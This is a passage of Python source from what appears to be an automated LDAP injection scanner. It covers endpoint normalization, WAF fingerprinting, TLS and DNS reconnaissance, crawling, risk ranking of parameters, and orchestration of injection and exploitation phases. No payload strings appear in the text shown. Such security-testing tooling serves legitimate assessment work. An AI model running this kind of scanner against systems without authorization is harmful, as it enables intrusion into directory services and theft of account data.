        """Normalise URL for dedup: strip IDs/UUIDs from path segments."""
        _UUID = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I)
        p = urlparse(url)
        segs = p.path.split("/")
        normed = "/".join("{id}" if (s.isdigit() or bool(_UUID.match(s))) else s for s in segs)
        return normed

    def _normalize_entry(
        self,
        _raw_ep: Any,
        target_url: Optional[str],
    ) -> Optional[Tuple]:
        """
        Normalize one raw entry dict into (url, method, params, hidden, source,
        priority_params, ldap_prob).  Returns None to skip this entry.

        Mirrors CMDinj _load_crawl_import() normalization block:
          Step 0 – URL + static/media filter
          Step 1 – Method
          Step 2 – Status skip (404/410/400)
          Step 3 – Source label
          Step 4 – Params (dict/list/qs/body/response_body)
          Step 5 – Hidden fields
          Step 6 – Fallback params
        """
        if not isinstance(_raw_ep, dict):
            return None

        # ── Step 0: URL ──────────────────────────────────────────────────────
        _url = (_raw_ep.get("url") or _raw_ep.get("endpoint")
                or _raw_ep.get("path") or "").strip()
        if not _url:
            return None
        if not _url.startswith("http"):
            _base = (target_url or self._cfg.target).rstrip("/")
            _url  = _base + ("" if _url.startswith("/") else "/") + _url.lstrip("/")

        _ep_path = urlparse(_url).path
        if _STATIC_EXT_LOADER.search(_ep_path):
            return None
        if _MEDIA_PATH_LOADER.search(_ep_path):
            return None
        if _SKIP_PATHS_LOADER.search(_ep_path):
            return None

        # Clean URL — strip query string (params extracted separately below)
        _parsed_url = urlparse(_url)
        _url_clean  = urlunparse(_parsed_url._replace(query="", fragment=""))

        # ── Step 1: Method ───────────────────────────────────────────────────
        _raw_method = _raw_ep.get("method") or _raw_ep.get("methods") or "GET"
        if isinstance(_raw_method, list):
            _raw_method = _raw_method[0] if _raw_method else "GET"
        _method = str(_raw_method).upper().strip()
        if _method not in ("GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS"):
            _method = "GET"
        # CMDinj: normalise PUT/PATCH/DELETE → POST for injection
        if _method in ("PUT","PATCH","DELETE"):
            _method = "POST"

        # ── Step 2: Skip 404/410/400 ─────────────────────────────────────────
        _raw_status = (_raw_ep.get("observed_status") or
                       _raw_ep.get("response_status") or
                       _raw_ep.get("status_code") or [])
        if isinstance(_raw_status, list):
            _raw_status = _raw_status[0] if _raw_status else 0
        _status = int(_raw_status) if _raw_status else 0
        _baseline = _raw_ep.get("baseline") or {}
        if not _status and isinstance(_baseline, dict):
            _status = int(_baseline.get("status") or 0)
        if _status in (404, 410, 400):
            return None

        # ── Step 3: Source label ─────────────────────────────────────────────
        _raw_src = _raw_ep.get("source") or "external"
        if isinstance(_raw_src, list):
            _SRC_MAP = {
                "JS_Analysis":         "js:inline",
                "JSON_Response":       "chained_path_d1",
                "JSON_Path":           "chained_path_d1",
                "Robots_Disallow":     "discovery_file",
                "Form":                "form@import",
                "HTML(Form_Action)":   "form@import",
                "HTML(HTML_Link)":     "chained_path_d2",
                "HTML(Robots_Disallow)":"discovery_file",
                "HTML(Seed)":          "path_probe",
            }
            _SRC_PRI = {"chained_path_d1":5,"js:inline":4,"discovery_file":3,
                        "chained_path_d2":2,"form@import":1,"path_probe":0}
            _mapped = [_SRC_MAP.get(s,"external") for s in _raw_src]
            _source = max(_mapped, key=lambda s: _SRC_PRI.get(s, -1))
        else:
            _source = str(_raw_src) if _raw_src else "external"

        # ── Step 4: Params ───────────────────────────────────────────────────
        params:          Dict[str,str] = {}
        priority_params: List[str]     = []

        # 4a. Explicit params field
        _ep_params = _raw_ep.get("params") or _raw_ep.get("parameters") or {}
        if isinstance(_ep_params, dict):
            # Check for Hellhound Spider bucketed format
            _is_bucketed = bool(_ep_params) and all(isinstance(v, list) for v in _ep_params.values())
            if _is_bucketed:
                _BUCKET_ORDER = ["runtime","openapi","js","form","query"]
                for _bucket in _BUCKET_ORDER + [b for b in _ep_params if b not in _BUCKET_ORDER]:
                    for _pname in (_ep_params.get(_bucket) or []):
                        _pk = str(_pname).strip()
                        if _pk and _pk not in params:
                            params[_pk] = "test"
                            if _HIGH_RISK_LDAP_LOADER.search(_pk):
                                priority_params.append(_pk)
            else:
                # Flat {name: value} dict
                for _pk, _pv in _ep_params.items():
                    _pk = str(_pk).strip()
                    if _pk:
                        params[_pk] = str(_pv) if _pv is not None else ""
                        if _HIGH_RISK_LDAP_LOADER.search(_pk):
                            priority_params.append(_pk)

        elif isinstance(_ep_params, list):
            for _item in _ep_params:
                if isinstance(_item, dict):
                    _pk = str(_item.get("name") or _item.get("key") or "")
                    _pv = str(_item.get("value") or _item.get("default") or _item.get("example") or "")
                    if _pk and _pk not in params:
                        params[_pk] = _pv
                        if _HIGH_RISK_LDAP_LOADER.search(_pk):
                            priority_params.append(_pk)
                elif isinstance(_item, str) and _item.strip():
                    _pk = _item.strip()
                    if _pk not in params:
                        params[_pk] = ""
                        if _HIGH_RISK_LDAP_LOADER.search(_pk):
                            priority_params.append(_pk)

        # 4b. Query-string params from URL
        for _pk, _pv_list in parse_qs(_parsed_url.query, keep_blank_values=True).items():
            if _pk not in params:
                params[_pk] = _pv_list[0] if _pv_list else ""
                if _HIGH_RISK_LDAP_LOADER.search(_pk):
                    priority_params.append(_pk)

        # 4c. Body fields (POST form or JSON body)
        _body_raw = _raw_ep.get("body") or _raw_ep.get("request_body") or ""
        _ct = ((_raw_ep.get("content_type") or
                (_raw_ep.get("headers") or {}).get("Content-Type","") or
                (_raw_ep.get("headers") or {}).get("content-type","")) or "").lower()
        if _body_raw:
            if "json" in _ct or (isinstance(_body_raw, str)
                                  and _body_raw.lstrip().startswith(("{","["))):
                try:
                    _bd = json.loads(_body_raw) if isinstance(_body_raw, str) else _body_raw
                    if isinstance(_bd, dict):
                        for _pk, _pv in _bd.items():
                            if str(_pk) not in params:
                                params[str(_pk)] = str(_pv) if _pv is not None else ""
                                if _HIGH_RISK_LDAP_LOADER.search(str(_pk)):
                                    priority_params.append(str(_pk))
                except Exception:
                    pass
            else:
                for _pk, _pv_list in parse_qs(
                        _body_raw if isinstance(_body_raw, str) else "",
                        keep_blank_values=True).items():
                    if _pk not in params:
                        params[_pk] = _pv_list[0] if _pv_list else ""
                        if _HIGH_RISK_LDAP_LOADER.search(_pk):
                            priority_params.append(_pk)

        # 4d. response_body JSON key chase (CMDinj Inst pattern)
        _resp_body = (_raw_ep.get("response_body") or _raw_ep.get("response") or "")
        if _resp_body and isinstance(_resp_body, str):
            _LDAP_RESP_KEYS = re.compile(
                r"^(?:user|uid|login|username|filter|query|search|dn|cn|ou|dc|"
                r"member|group|role|directory|credential|account|principal)$", re.I)
            try:
                _rd = json.loads(_resp_body)
                def _walk_resp(node: Any) -> None:
                    if isinstance(node, dict):
                        for _rk, _rv in node.items():
                            if _LDAP_RESP_KEYS.match(str(_rk)) and str(_rk) not in params:
                                params[str(_rk)] = "test"
                                priority_params.append(str(_rk))
                            _walk_resp(_rv)
                    elif isinstance(node, list):
                        for _ri in node: _walk_resp(_ri)
                _walk_resp(_rd)
            except Exception:
                pass

        # ── Step 5: Hidden fields ─────────────────────────────────────────────
        _hidden_raw = _raw_ep.get("hidden") or _raw_ep.get("hidden_params") or {}
        _hidden: Dict[str,str] = {}
        if isinstance(_hidden_raw, dict):
            _hidden = {str(k): str(v) for k, v in _hidden_raw.items()}

        # ── Step 6: LDAP-specific fallback params if nothing found ────────────
        if not params:
            _path_segs = [s.lower() for s in _parsed_url.path.split("/") if s]
            _HINT_MAP = {
                "login":    ["username","password","user","uid","dn"],
                "search":   ["filter","query","q","cn","ou","dc"],
                "auth":     ["username","password","user","uid"],
                "ldap":     ["filter","dn","base","scope"],
                "user":     ["uid","username","user","sAMAccountName"],
                "profile":  ["user","uid","cn","dn"],
                "directory":["filter","dn","base","cn"],
                "api":      ["filter","query","q","user"],
            }
            for _seg in _path_segs:
                if _seg in _HINT_MAP:
                    for _h in _HINT_MAP[_seg]:
                        if _h not in params:
                            params[_h] = ""
                            priority_params.append(_h)
            if not params:
                params = {"username": "", "filter": "", "query": ""}

        # ── Step 7: LDAP probability score ────────────────────────────────────
        _ldap_prob = int(_raw_ep.get("ldap_prob") or _raw_ep.get("priority") or 0)
        if not _ldap_prob:
            high_params = [p for p in params if _HIGH_RISK_LDAP_LOADER.search(p)]
            _ldap_prob = min(10 + len(high_params) * 15, 90)

        return _url_clean, _method, params, _hidden, _source, priority_params, _ldap_prob


# ═══════════════════════════════════════════════════════════════════════════════
# §20  SCAN ORCHESTRATOR — Main pipeline coordination
# ═══════════════════════════════════════════════════════════════════════════════

class ScanOrchestrator:
    """
    V8 — Coordinates all phases with ControlPlaneIntelligence as the adaptive brain.
    Injection runs concurrent verification via thread pool.
    V8 Adds: ControlPlane, WebSocketProbe, RecursiveParameterDiscovery,
             BehavioralRiskAnalyzer, AdaptiveBaselineCircuitBreaker,
             ChainedPayloadMutator, ConfidenceScorer, ImpactMapper,
             CrossEndpointCorrelator.
    """

    def __init__(self, cfg: ScanConfig):
        self._cfg       = cfg
        self._start     = datetime.now(timezone.utc)
        self._handoff   = ScanHandoff(
            scan_id         = cfg.scan_id,
            target          = cfg.target,
            timestamp_start = now_iso(),
        )
        # Core components
        self._budget  = AdaptiveBudgetManager(cfg)
        self._client  = HTTPClient(cfg, self._budget)
        self._memory  = LearningMemory()
        self._logger  = ScanSessionLogger(cfg)
        self._serializer = HandoffSerializer(cfg)
        self._status = StatusBoard(orchestrated=not cfg.quiet)

        # V8 — Control Plane Intelligence
        self._cp = ControlPlaneIntelligence(cfg, self._client)

        # V8 — New discovery engines
        self._ws_probe  = WebSocketProbe(cfg, self._client)
        self._rpd       = RecursiveParameterDiscovery(cfg, self._client)

        # V8 — Cross-endpoint correlator
        self._correlator = CrossEndpointCorrelator()

        # V11 — New components
        self._tracer        = ExecutionTracer()
        self._liveness      = TargetLivenessChecker(cfg)

        # V12 — Adaptive intelligence engines
        self._target_model  = AdaptiveTargetModel()
        self._fdd           = None   # set after client ready (needs budget ref)
        self._dpr           = None   # set in injection phase
        self._tpe           = None   # set in injection phase
        self._ev            = None   # set in finalize

        # Will be set after Phase 0
        self._server_type = LDAPServerType.GENERIC.value
        self._framework   = "generic"
        self._raw_findings: List[RawLDAPFinding] = []
        self._server_profile = ServerTypeProfile()
        self._schema_intel: List[str] = []
        self._rootdse_data: Dict[str, Any] = {}
        self._openapi_specs: List[str] = []
        self._graphql_urls:  List[str] = []
        self._pages_html:    List[str] = []

    def run(self) -> str:
        """
        V8 — Execute full scan pipeline with ControlPlane governing each phase.
        """
        self._status.start()
        try:
            # ── Phase 0: Target Liveness Pre-flight (V11) ─────────────────────
            self._tracer.log("phase0", "liveness_check", self._cfg.target)
            section("PHASE 0: TARGET LIVENESS PRE-FLIGHT")
            liveness = self._liveness.check()
            self._handoff.target_dns_resolved = liveness["dns_ok"]
            self._handoff.target_ports_open   = liveness["open_ports"]
            self._handoff.target_live         = liveness["live"]

            phase_summary_box(
                "LIVENESS CHECK",
                [
                    ("DNS Resolved",  color("YES — " + liveness["resolved_ip"], C.BGREEN)
                                      if liveness["dns_ok"] else color("FAILED", C.BRED)),
                    ("TCP Ports",     str(liveness["open_ports"]) or "none"),
                    ("LDAP Ports",    color(str(liveness["ldap_ports"]), C.BRED + C.BOLD)
                                      if liveness["ldap_ports"] else "none open"),
                    ("HTTP Probe",    color(str(liveness["http_status"]), C.BGREEN)
                                      if liveness["http_ok"] else color("FAIL", C.BRED)),
                    ("Confidence",    color(liveness["confidence"].upper(),
                                           C.BGREEN if liveness["confidence"] == "high"
                                           else C.BYELLOW if liveness["confidence"] == "medium"
                                           else C.BRED)),
                ],
                col=C.BBLUE,
            )
            if not liveness["live"] and not self._cfg.force_scan:
                err(f"Target liveness check FAILED ({liveness['reason']}) — aborting. Use --force-scan to override.")
                self._tracer.log("phase0", "liveness_abort", liveness["reason"], outcome="abort")
                return self._finalize([])

            if liveness["confidence"] in ("low", "medium"):
                warn(f"Target liveness confidence: {liveness['confidence'].upper()} — proceeding with caution")
                self._tracer.log("phase0", "liveness_warn", liveness.get("reason",""), outcome="warn")
            else:
                ok(f"Target live — confidence: {liveness['confidence'].upper()}")
                self._tracer.log("phase0", "liveness_ok", liveness["resolved_ip"], outcome="ok")

            # Boost LDAP signals if LDAP ports discovered during liveness
            if liveness["ldap_ports"]:
                self._handoff.raw_ldap_ports_open = liveness["ldap_ports"]
                info(f"  [Liveness] LDAP ports found: {liveness['ldap_ports']}")

            # ── Phase 1: Target Intelligence ──────────────────────────────────
            self._logger.log_phase("intelligence")
            self._status.phase = "Intel"
            self._tracer.log("phase1", "intelligence_start", self._cfg.target)
            self._phase0_intelligence()

            # Notify control plane of stack + WAF context
            self._cp.on_framework_detected(self._framework,
                                            self._server_profile.scores.get(self._framework, 0) * 30)
            if self._client.waf_name:
                self._cp.on_waf_detected(
                    self._client.waf_name,
                    getattr(self._client, "_survived_chars", set()),
                )

            # ── Phase 2: Discovery + WebSocket + Recursive Params ─────────────
            self._logger.log_phase("discovery")
            self._status.phase = "Discovery"
            self._tracer.log("phase2", "discovery_start", "crawl+spec+spa")
            all_eps = self._phase1_discovery()

            if not all_eps:
                warn("No scannable endpoints found — exiting")
                return self._finalize([])

            # V8: Discover OpenAPI/GraphQL specs
            self._openapi_specs, self._graphql_urls = self._rpd.discover_specs(
                self._pages_html, self._client)

            # V8: Expand endpoints with recursive parameter discovery
            expanded_eps: List[Endpoint] = []
            for ep in all_eps:
                ep2 = self._rpd.expand_endpoint(ep, self._openapi_specs, self._graphql_urls)
                expanded_eps.append(ep2)
            all_eps = expanded_eps

            # V8: WebSocket endpoint discovery
            js_urls = getattr(self, "_discovered_js_urls", [])
            ws_eps  = self._ws_probe.probe(self._pages_html, js_urls)
            if ws_eps:
                # WS endpoints are added as injectable (inject via query params)
                all_eps.extend(ws_eps)
                info(f"  [V8] Added {len(ws_eps)} WebSocket endpoint(s) to scan queue")

            # ── Phase 3: Behavioral Risk Analysis (V8 enhancement) ────────────
            self._logger.log_phase("behavioral_risk")
            self._status.phase = "BehavioralRisk"
            behavioral_scores = self._phase3_behavioral_risk(all_eps)

            # Feed Phase 3 results into control plane
            high_risk_params = [
                f"{ep.url}:{param}"
                for ep in all_eps
                for param, sc in behavioral_scores.get(ep.key, {}).items()
                if sc.risk_level == "HIGH"
            ]
            self._cp.phase_feedback("phase3", {"high_risk_params": high_risk_params})

            # Re-rank endpoints using behavioral scores
            all_eps = self._apply_behavioral_ranking(all_eps, behavioral_scores)

            # ── Phase 4: Vulnerability Audit ──────────────────────────────────
            self._logger.log_phase("baseline")
            self._status.phase = "Baselines"
            baselines, auth_tested = self._phase2_baseline(all_eps)
            self._handoff.auth_tested = auth_tested

            # Raw LDAP Direct Testing
            self._logger.log_phase("raw_ldap")
            self._status.phase = "Raw LDAP"
            if self._raw_findings:
                section("PHASE 4b: DIRECT LDAP TESTING")
                for rf in self._raw_findings:
                    self._logger.log_raw_ldap(rf)
                    finding(f"Detected {rf.finding_type} on {rf.host}:{rf.port}")

            # Injection + Detection + Verification
            self._logger.log_phase("injection")
            self._status.phase = "Injection"
            phase_header(4, "Injection & Verification")
            self._tracer.log("phase4", "injection_start",
                             f"{len(all_eps)} endpoints | baselines={len(baselines)}")

            # Feature: Scan Resumption
            scanned_keys = []
            if self._cfg.resume:
                scanned_keys = self._load_checkpoint()
                info(f"Resuming scan — skipping {len(scanned_keys)} previously scanned endpoints")
                all_eps = [e for e in all_eps if e.key not in scanned_keys]

            web_findings = self._phase456_injection(all_eps, baselines, scanned_keys)

            # V8: Enrich findings with confidence + impact
            web_findings = self._enrich_findings_v8(web_findings)

            # V8: Cross-endpoint correlation
            for f in web_findings:
                self._correlator.register(f)
            self._correlator.enrich_handoff(self._handoff)

            # V8: Phase 4 feedback to control plane
            confirmed_cnt = sum(1 for f in web_findings
                                if f.verification_grade == "CONFIRMED")
            self._cp.phase_feedback("phase4", {"confirmed_count": confirmed_cnt})

            # ── Phase 5: Handoff Emission ──────────────────────────────────────
            self._logger.log_phase("handoff")
            self._status.phase = "Finalizing"
            return self._finalize(web_findings)
        finally:
            self._status.stop()

    def _phase3_behavioral_risk(
        self, eps: List[Endpoint]
    ) -> Dict[str, Dict]:
        """
        V8 Phase 3 — Behavioral probe-based risk analysis.
        Replaces pure keyword heuristics with statistical differential probing.
        """
        section("PHASE 3: BEHAVIORAL RISK ANALYSIS")
        info("  [V8] Running probe-based behavioral risk scoring...")

        analyzer = BehavioralRiskAnalyzer(self._cfg, self._client, self._cp.memory)
        all_scores: Dict[str, Dict] = {}

        # Only probe top-N endpoints to preserve budget
        top_eps = [ep for ep in eps if ep.ldap_prob >= 15][:12]

        for ep in top_eps:
            try:
                scores = analyzer.analyze_endpoint(ep)
                all_scores[ep.key] = scores
                highs = [p for p, sc in scores.items() if sc.risk_level == "HIGH"]
                if highs:
                    info(f"  [BRA] {ep.url} — HIGH-risk params: {highs}")
            except Exception as exc:
                vprint(f"  [BRA] Error on {ep.url}: {exc}")

        return all_scores

    def _apply_behavioral_ranking(
        self, eps: List[Endpoint],
        behavioral_scores: Dict[str, Dict]
    ) -> List[Endpoint]:
        """
        V8 — Re-rank endpoints using behavioral risk scores.
        Endpoints with HIGH-risk behavioral params are boosted.
        """
        def _boost(ep: Endpoint) -> float:
            scores = behavioral_scores.get(ep.key, {})
            high_count = sum(1 for sc in scores.values() if sc.risk_level == "HIGH")
            med_count  = sum(1 for sc in scores.values() if sc.risk_level == "MEDIUM")
            # Also track auth function class
            auth_func  = sum(1 for sc in scores.values() if sc.function_class == "auth")
            return (ep.ldap_prob
                    + high_count * 20
                    + med_count  * 8
                    + auth_func  * 15)

        return sorted(eps, key=_boost, reverse=True)

    def _enrich_findings_v8(
        self, findings: List["HandoffFinding"]
    ) -> List["HandoffFinding"]:
        """
        V8 — Enrich each finding with:
          - Probabilistic confidence score
          - Real-world impact scenario
          - Retest guidance
          - Control plane memory of successful encodings
        """
        for f in findings:
            # Confidence scoring
            det = DetectionResult(
                fired=True,
                score=f.diff_ratio * 10,
                signals=[],
                severity=Severity.HIGH,
                evidence="",
            )
            f.reproduction_confidence = ConfidenceScorer.score(
                det_result        = det,
                verification_grade= f.verification_grade,
                oob_triggered     = f.oob_triggered,
                replay_consistent  = f.reproduction_confidence > 50,
                signal_count      = len(f.detection_signals),
            )

            # Impact mapping
            impact = ImpactMapper.map_technique(
                technique    = f.payload_technique,
                severity     = f.severity,
                extracted_data = f.exploiter_context.get("extracted_values"),
            )
            f.exploiter_context["impact"] = impact

            # Retest steps
            f.exploiter_context["retest_steps"] = ImpactMapper.retest_steps(f)

            # Record param signal in control plane memory
            self._cp.memory.record_param_signal(f.endpoint_url, f.parameter_name)
            self._cp.memory.record_payload(f.payload_raw, success=True)

        return findings

    def _phase0_intelligence(self) -> None:
        """Wave 3: Multi-vector target fingerprinting (§3.1-3.6)."""
        phase_header(1, "Target Intelligence")
        
        # Wave 3: Deferred WAF fingerprinting (§3.1)
        waf_fp = WAFFingerprinter(self._cfg, self._client)
        survived = waf_fp.fingerprint()
        self._handoff.survived_metacharacters = sorted(survived)
        self._handoff.waf_detected = self._client.waf_detected
        self._handoff.waf_name     = self._client.waf_name or ""

        # V11: WAF Confidence — not binary; indeterminate if probe inconclusive
        survived_count = len(survived)
        if self._client.waf_detected:
            if survived_count == 0:
                waf_conf = "high"       # everything blocked → definite WAF
            elif survived_count <= 3:
                waf_conf = "medium"
            else:
                waf_conf = "low"        # many chars pass → weak WAF signature
        elif survived_count >= 8:
            waf_conf = "none"           # no WAF behaviour at all
        else:
            waf_conf = "indeterminate"  # ambiguous — flag rather than assume
        self._handoff.waf_confidence = waf_conf

        if self._client.waf_detected:
            warn(f"WAF Detected: {self._client.waf_name} (confidence={waf_conf})")
        elif waf_conf == "indeterminate":
            warn(f"WAF status INDETERMINATE — survived chars={survived_count}. Treating conservatively.")

        # Network Jitter Calibration (C3.4)
        jit = NetworkJitterCalibrator(self._cfg)
        calibrated_z = jit.calibrate()
        if calibrated_z:
            self._cfg.calibrated_z_min = calibrated_z
            info(f"  Timing calibration: z_min={calibrated_z:.2f}")
            
        host = urlparse(self._cfg.target).hostname or self._cfg.target
        sans = self._extract_tls_sans(host)
        if sans:
            info(f"  TLS SAN intel: {', '.join(sans[:3])}")
            for s in sans:
                if ".local" in s or "corp" in s or "ad" in s:
                    self._server_profile.add("ad", 15)

        srvs = self._query_ldap_srv(host)
        if srvs:
            info(f"  DNS SRV intel: {len(srvs)} records found")
            self._server_profile.add("ad", 30)

        # Raw LDAP testing (Phase 3 runs here for intel feeding)
        ldap_tester = LDAPDirectTester(self._cfg)
        raw_findings, intel = ldap_tester.run()
        self._raw_findings = raw_findings
        self._schema_intel = intel.get("schema_attributes", [])
        self._rootdse_data = intel.get("rootdse_data", {})   # V6: feed TargetAwarePayloadAdaptor

        # Merge intel into profile
        raw_st = intel.get("server_type", "generic")
        if raw_st != "generic":
            self._server_profile.add(raw_st, 50)

        self._server_type = self._server_profile.best()
        self._handoff.raw_ldap_ports_open = intel.get("open_ports", [])
        self._handoff.ldap_server_type = self._server_type

        # V12: Feed stack evidence into adaptive target model
        stack_ev: List[str] = []
        if self._client.waf_name:
            stack_ev.append(f"WAF:{self._client.waf_name}")
        if self._server_type != "generic":
            stack_ev.append(f"LDAP_SERVER:{self._server_type}")
        if self._handoff.raw_ldap_ports_open:
            stack_ev.extend(f"LDAP_PORT:{p}" for p in self._handoff.raw_ldap_ports_open)
        if self._schema_intel:
            stack_ev.append(f"SCHEMA_ATTRS:{len(self._schema_intel)}")
        self._target_model.observe_stack(stack_ev)
        self._tracer.log("phase1", "target_model_seeded",
                         f"stack_evidence={stack_ev}", outcome="ok")

        # Donate unused discovery budget
        self._budget.donate_unused("discovery")

    def _extract_tls_sans(self, host: str) -> List[str]:
        """Wave 3: Extract SANs from target certificate (§3.2)."""
        import socket
        import ssl
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, 443), timeout=3) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    if not cert: return []
                    # Simplified parsing for SANs
                    import hashlib
                    return list(set(re.findall(r'[a-z0-9.-]+\.[a-z]{2,}', str(ssock.getpeercert()), re.I)))
        except: return []

    def _query_ldap_srv(self, host: str) -> List[str]:
        """Wave 3: DNS SRV lookup for LDAP service records (§3.3)."""
        domain = ".".join(host.split(".")[-2:])
        results = []
        try:
            # Common LDAP SRV records
            for prefix in ["_ldap._tcp.", "_ldap._tcp.dc._msdcs."]:
                target = prefix + domain
                try: 
                    # Use socket to probe if record exists (lazy check)
                    socket.gethostbyname(target)
                    results.append(target)
                except: pass
        except: pass
        return results

    def _phase1_discovery(self) -> List[Endpoint]:
        """Crawl + SPA + APISpec + Sitemap → ranked endpoints."""
        phase_header(2, "Discovery")
        
        # ← C2.3 FIX: Removed duplicate WAF fingerprinting (already done in Phase 0)
        # WAF results are cached in self._handoff.survived_metacharacters and client._survived_chars
        
        if self._cfg.endpoints_file:
            # V10: CMDinj-ported loader — fatal sys.exit(1) on any load failure,
            # so returning here is safe: if we get eps, they are valid.
            loader  = ExternalEndpointLoader(self._cfg)
            ext_eps = loader.load()
            if ext_eps:
                ok(f"[Loader] {len(ext_eps)} endpoint(s) loaded — skipping crawl phase")
                return EndpointNormalizer.normalize(ext_eps)
        
        crawler  = StaticCrawler(self._cfg, self._client)
        pages, form_eps = crawler.crawl()

        spec_eps = APISpecHarvester(self._cfg, self._client).harvest()
        gql_eps  = GraphQLHarvester(self._cfg, self._client).harvest()  # ENHANCEMENT #9
        sm_urls  = DiscoveryFileHarvester(self._cfg, self._client).harvest()

        # V8: Use cached HTML from crawler (no re-fetch needed)
        self._pages_html = list(crawler._page_html_cache.values())

        # V8: Store JS URLs discovered during SPA harvesting
        spa_inst = SPAHarvester(self._cfg, self._client)
        spa_eps  = spa_inst.harvest(pages)
        try:
            self._discovered_js_urls = list(getattr(spa_inst, "_js_urls", []))
        except Exception:
            self._discovered_js_urls = []

        # Convert sitemap URLs to minimal endpoints
        sm_eps: List[Endpoint] = []
        for u in sm_urls[:20]:
            sm_eps.append(Endpoint(
                url=u, method="GET",
                params=["search","q","filter","username"],
                source="sitemap", ldap_prob=10,
            ))

        # ENHANCEMENT #9: Include GraphQL mutation endpoints in discovery
        raw_eps = form_eps + spa_eps + spec_eps + gql_eps + sm_eps

        # Normalize and deduplicate
        normalized = EndpointNormalizer.normalize(raw_eps)

        # Boost ldap_prob if LDAP ports confirmed open
        ldap_ports_open = bool(self._handoff.raw_ldap_ports_open)
        if ldap_ports_open:
            for ep in normalized:
                ep.ldap_prob = min(ep.ldap_prob + 20, 90)

        # Clone for auth variants
        if self._cfg.auth_url:
            normalized = EndpointNormalizer.clone_for_auth(
                normalized)

        # Rank by risk score
        ranked = EndpointRiskRanker.rank(
            normalized,
            ldap_ports_open = ldap_ports_open,
            framework       = self._framework,
        )

        # Filter by min probability
        if not self._cfg.force_scan:
            scannable = [
                ep for ep in ranked
                if ep.ldap_prob >= self._cfg.min_ldap_prob
                or ep.is_auth_ep
                or ep.source in ("fallback",
                                 "form", "form_regex")
            ]
        else:
            scannable = ranked

        self._handoff.endpoints_discovered = len(normalized)
        info(f"  Endpoints: {len(normalized)} discovered, {len(scannable)} scannable")

        # V12: Feedback-Driven Discovery — probe top endpoints, re-rank live
        self._fdd = FeedbackDrivenDiscovery(self._client, self._cfg, self._budget)
        info("  [V12] Running FeedbackDrivenDiscovery probes...")
        self._tracer.log("phase2", "fdd_rerank", f"probing top {min(30,len(scannable))} endpoints")
        scannable = self._fdd.rerank(scannable, self._target_model)

        # V12: Apply AdaptiveTargetModel re-scoring on top of FDD
        scannable = self._target_model.prioritized_endpoints(scannable)

        # Also use AdaptiveTargetModel semantic scores to boost ldap_prob
        for ep in scannable:
            semantic_boost = sum(
                self._target_model.score_param_name(p) for p in ep.params)
            ep.ldap_prob = min(int(ep.ldap_prob + semantic_boost), 95)

        # ── Risk Analysis Summary (Enterprise Phase 3 Box) ───────────────────
        phase_header(3, "Risk Analysis")
        
        high = [e for e in scannable if any(risk_score(p) >= 2 for p in e.params)]
        med  = [e for e in scannable if any(risk_score(p) == 1 for p in e.params) and e not in high]
        low  = [e for e in scannable if e not in high and e not in med]

        phase_summary_box(
            "ENDPOINT RISK CLASSIFICATION",
            [
                ("Discovered (total)",  len(normalized)),
                ("Scannable",           len(scannable)),
                ("High-risk params",    color(str(len(high)), C.BRED   + C.BOLD)),
                ("Medium-risk params",  color(str(len(med)),  C.BYELLOW+ C.BOLD)),
                ("Low-risk",            str(len(low))),
            ],
            col=C.BYELLOW,
        )

        tprint(f"\n  {color('Top candidates:', C.BCYAN + C.BOLD)} {color(f'(top {min(10,len(scannable))} of {len(scannable)})', C.DIM)}")
        for ep in scannable[:10]:
            _high_params = [p for p in ep.params if risk_score(p) >= 2]
            _med_params  = [p for p in ep.params if risk_score(p) == 1]
            
            if _high_params:
                marker = color("★ ", C.BRED)
            elif _med_params:
                marker = color("◈ ", C.BYELLOW)
            else:
                marker = color("· ", C.DIM)
            
            def _pcol(p):
                if p in _high_params: return color(p, C.BRED, C.BOLD)
                if p in _med_params:  return color(p, C.BYELLOW)
                return color(p, C.DIM)
            
            pd = ", ".join(_pcol(p) for p in ep.params[:5])
            _src_lbl = color(f" ← {ep.source}", C.DIM) if ep.source else ""
            tprint(f"  {marker}{color(ep.method, C.BYELLOW)} {color(ep.url[:50], C.BWHITE)}  [{pd}]{_src_lbl}")

        if len(scannable) > 10:
            tprint(f"\n  {color('Plus ' + str(len(scannable)-10) + ' more endpoints in queue...', C.DIM)}")
        tprint("")

        return scannable


    def _phase2_baseline(
        self, eps: List[Endpoint]
    ) -> Tuple[Dict[str, Baseline], bool]:
        """
        V8 — Budget mode selection + baseline collection with circuit breaker.
        Returns (baselines_dict, auth_was_tested).
        """
        section("PHASE 4: VULNERABILITY AUDIT")
        info("Step 1: Baseline Collection")
        self._status.phase = "Baselines"
        
        # Authenticate if configured
        auth_tested = False
        if self._cfg.auth_url:
            self._status.phase = "Auth"
            auth_ok = self._client.authenticate()
            auth_tested = auth_ok
            if not auth_ok:
                warn("Authentication failed — auth-state testing disabled")
                eps = [e for e in eps if e.auth_state == AuthState.UNAUTH]

        # Select budget mode
        ldap_signals = bool(self._raw_findings or self._handoff.raw_ldap_ports_open)
        mode = self._budget.select_mode(
            endpoint_count    = len(eps),
            ldap_signals_found= ldap_signals,
            ldap_ports_open   = bool(self._handoff.raw_ldap_ports_open),
            waf_detected      = self._client.waf_detected,
        )
        self._budget.initialize(qualified_endpoint_count=len(eps))
        self._handoff.budget_mode = mode.value
        
        success(f"Budget Mode: {mode.value} | Total: {self._budget.total}")

        # V8: Wrap baseline collection with circuit breaker
        circuit = AdaptiveBaselineCircuitBreaker(self._cp.memory)
        collector = BaselineCollector(self._client, self._cfg)

        baselines: Dict[str, Baseline] = {}
        lock = threading.Lock()

        def _cb_collect(ep: Endpoint) -> None:
            # Check if CP reports this endpoint rate-limited
            if self._cp.memory.is_rate_limited(ep.url):
                delay = self._cp.inter_request_delay()
                time.sleep(delay)

            bl = circuit.wrap_collect(collector, ep)
            if bl is not None:
                with lock:
                    baselines[ep.key] = bl
                self._cp.on_request_success(ep.url)
            else:
                self._cp.on_rate_limit(ep.url)

        with ThreadPoolExecutor(
            max_workers=min(self._cfg.threads, 8),
            thread_name_prefix="baseline"
        ) as pool:
            futs = [pool.submit(_cb_collect, ep) for ep in eps]
            for fut in as_completed(futs):
                try:
                    fut.result()
                except Exception as exc:
                    vprint(f"  Baseline CB error: {exc}")

